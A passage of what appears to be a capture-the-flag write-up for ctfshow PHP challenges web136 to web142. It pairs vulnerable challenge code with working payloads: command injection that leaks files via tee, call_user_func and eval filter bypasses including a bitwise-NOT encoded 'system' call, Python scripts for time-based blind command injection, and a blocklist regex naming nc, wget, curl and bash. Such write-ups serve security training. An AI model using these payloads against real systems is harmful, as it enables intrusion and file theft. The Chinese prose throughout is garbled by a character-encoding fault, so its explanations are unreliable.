class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/jjlovefj/article/details/83176871" target="_blank" rel="noopener">Linux teeå‘½ä»¤</a></p><pre class="line-numbers language-php"><code class="language-php">å¸¸è§ç”¨ä¾‹ï¼š tee file <span class="token comment" spellcheck="true">//è¦†ç›–</span>tee <span class="token operator">-</span>a file <span class="token comment" spellcheck="true">//è¿½åŠ </span>tee <span class="token operator">-</span> <span class="token comment" spellcheck="true">//è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸¤æ¬¡ tee - - //è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸‰æ¬¡</span>tee file1 file2 <span class="token operator">-</span> <span class="token comment" spellcheck="true">//è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸¤æ¬¡,å¹¶å†™åˆ°é‚£ä¸¤ä¸ªæ–‡ä»¶ä¸­</span>ls <span class="token operator">|</span> tee fileå¦ï¼šæŠŠæ ‡å‡†é”™è¯¯ä¹Ÿè¢«teeè¯»å– ls â€œ<span class="token operator">*</span>â€ <span class="token number">2</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span> <span class="token operator">|</span> tee ls<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>ls \<span class="token operator">|</span>tee <span class="token number">1</span><span class="token comment" spellcheck="true">//å°†æ ¹ç›®å½•ä¸‹çš„å†…å®¹å†™å…¥1</span>è®¿é—®<span class="token number">1</span>ï¼Œä¸‹è½½æ–‡ä»¶å‘ç°f149_15_h3r3<span class="token operator">?</span>c<span class="token operator">=</span>nl <span class="token operator">/</span>f149_15_h3r3<span class="token operator">|</span>tee <span class="token number">1</span>è®¿é—®<span class="token number">1</span>ï¼Œä¸‹è½½æ–‡ä»¶å¾—flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒç”¨ç±»ä¸­å‡½æ•°ï¼Œéœ€è¦è°ƒç”¨é™æ€ç±»</p><pre><code>phpä¸­ -&gt;ä¸:: è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«-&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•</code></pre><p>payloadï¼š<code>ctfshow=ctfshow::getFlag</code></p><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="phpç‰¹æ€§ï¼š-1"><a href="#phpç‰¹æ€§ï¼š-1" class="headerlink" title="phpç‰¹æ€§ï¼š"></a>phpç‰¹æ€§ï¼š</h3><p>è€ƒå¯Ÿäº†call_user_func()ç”¨æ•°ç»„å½¢å¼è°ƒç”¨ç±»æ–¹æ³•</p><p>è¯¦çœ‹ï¼š<a href="https://www.wodecun.com/blog/7981.html" target="_blank" rel="noopener">æ ¹æ®æ–¹æ³•åè°ƒç”¨call_user_func()è¯¦è§£</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">,</span> <span class="token string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>è°ƒç”¨classnameè¿™ä¸ªç±»é‡Œçš„sya_helloæ–¹æ³•<span class="token keyword">array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$classname</span>  ç±»å<span class="token keyword">array</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>say_hello   <span class="token function">say_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>call_user_funcå‡½æ•°é‡Œé¢å¯ä»¥ä¼ æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ç±»åæˆ–è€…ç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ç±»çš„æ–¹æ³•åï¼ŒåŒæ ·å¯ä»¥è°ƒç”¨ã€‚</p><pre class="line-numbers language-php"><code class="language-php">ctfshow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>ctfshow<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web139â€”â€”ç›²æ‰“-æœªå®æ“"><a href="#web139â€”â€”ç›²æ‰“-æœªå®æ“" class="headerlink" title="web139â€”â€”ç›²æ‰“(æœªå®æ“)"></a>web139â€”â€”ç›²æ‰“(æœªå®æ“)</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/linux/linux-comm-awk.html" target="_blank" rel="noopener">awkå‘½ä»¤</a>ï¼šæ˜¯ä¸€ä¸ªå¼ºå¤§çš„<strong>æ–‡æœ¬åˆ†æ</strong>å·¥å…·</p><pre class="line-numbers language-php"><code class="language-php">ç”¨awkå‘½ä»¤ã€cutå‘½ä»¤æˆªå–å­—ç¬¦sleepå‘½ä»¤ç¡®è®¤æ˜¯å¦æ­£ç¡®awk <span class="token constant">NR</span><span class="token operator">==</span><span class="token number">2</span> è·å–ç¬¬äºŒè¡Œä¿¡æ¯cut <span class="token operator">-</span>c <span class="token number">1</span>  æˆªå–ç¬¬<span class="token number">1</span>ä¸ªå­—ç¬¦zshä¸‹<span class="token keyword">if</span>è¯­å¥çš„æ ¼å¼ï¼š <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>condition<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span> elif <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‚è€ƒå¤§ä½¬çš„è„šæœ¬ï¼š<br>è·å–æ–‡ä»¶åçš„è„šæœ¬</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> stringstr<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits    <span class="token comment" spellcheck="true">#ç”Ÿæˆæ‰€æœ‰å­—æ¯ä¸æ•°å­—[a-zA-Z0-9]</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> str<span class="token punctuation">:</span>            payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            url<span class="token operator">=</span><span class="token string">"http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="</span><span class="token operator">+</span>payload            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result<span class="token operator">=</span>result<span class="token operator">+</span>n                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'9'</span><span class="token punctuation">:</span>                key<span class="token operator">=</span><span class="token number">1</span>    result<span class="token operator">+=</span><span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çŒœè§£æ–‡ä»¶å†…å®¹çš„è„šæœ¬ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> stringstr<span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span><span class="token comment" spellcheck="true">#è·å–å°å†™å­—æ¯ä¸æ•°å­—</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> str<span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(payload)</span>        url<span class="token operator">=</span><span class="token string">"http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="</span><span class="token operator">+</span>payload        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#time()ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å“åº”æ—¶é—´ï¼Œç¬¬äºŒä¸ªæ˜¯è¯»å–æ—¶é—´</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web140â€”â€”æ¾æ•£æ¯”è¾ƒ"><a href="#web140â€”â€”æ¾æ•£æ¯”è¾ƒ" class="headerlink" title="web140â€”â€”æ¾æ•£æ¯”è¾ƒ=="></a>web140â€”â€”æ¾æ•£æ¯”è¾ƒ==</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $f1($f2());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹<a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHPç±»å‹æ¯”è¾ƒè¡¨</a> å¯å‘ç°</p><p><strong><code>0==â€œå­—ç¬¦ä¸²â€</code> è¿”å›çš„æ˜¯TRUE</strong></p><p>intvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p><p>payloadï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">current</span><span class="token punctuation">(</span>localeconv<span class="token punctuation">)</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     å› ä¸º<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html md5åå¼€å¤´çš„æ•°å­—æ‰€ä»¥æˆ‘ä»¬æ”¹ç”¨sha1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web141â€”â€”å–å"><a href="#web141â€”â€”å–å" class="headerlink" title="web141â€”â€”å–å~"></a>web141â€”â€”å–å~</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413" target="_blank" rel="noopener">ç»•è¿‡æ— å­—æ¯æ•°å­—çš„æ–¹æ³•å‚è€ƒyuå¸ˆå‚…çš„è„šæœ¬</a>ï¼šè¿™é‡Œç›´æ¥åˆ©ç”¨å–åè„šæœ¬</p><p>ç»•è¿‡returnçš„æ–¹å¼ï¼š<br>phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ <code>1-phpinfo();</code>ç»“åˆå‡å·æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚ï¼ˆä¸ä¸€å®šæ˜¯å‡å·ï¼Œè¿˜æœ‰åŠ ã€ä¹˜ã€é™¤å·ï¼Œè‹¥ç”¨åŠ å·ã€‚è¦ç”¨<code>+</code>ï¼Œè¦è¿›è¡ŒURLç¼–ç ï¼Œè¿™æ˜¯ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä¸è¿›è¡Œç¼–ç ä¼šå½“ä½œç©ºæ ¼ï¼‰</p><pre><code>system(tac f*);ç»è¿‡å–åå¤„ç†(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);payloadï¼š?v1=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&amp;v2=1</code></pre><p>è¿è¡Œå®Œç›´æ¥æŠ¥æ¯’ï¼Œå…³é—­æ€è½¯åé£Ÿç”¨ï¼Œæ­¤å¤„ä¼šå…ˆè¿›è¡Œurlè§£ç å†åŒ¹é…</p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php">payload<span class="token punctuation">:</span><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">0</span>       å…«è¿›åˆ¶<span class="token operator">?</span>v1<span class="token operator">=</span><span class="token 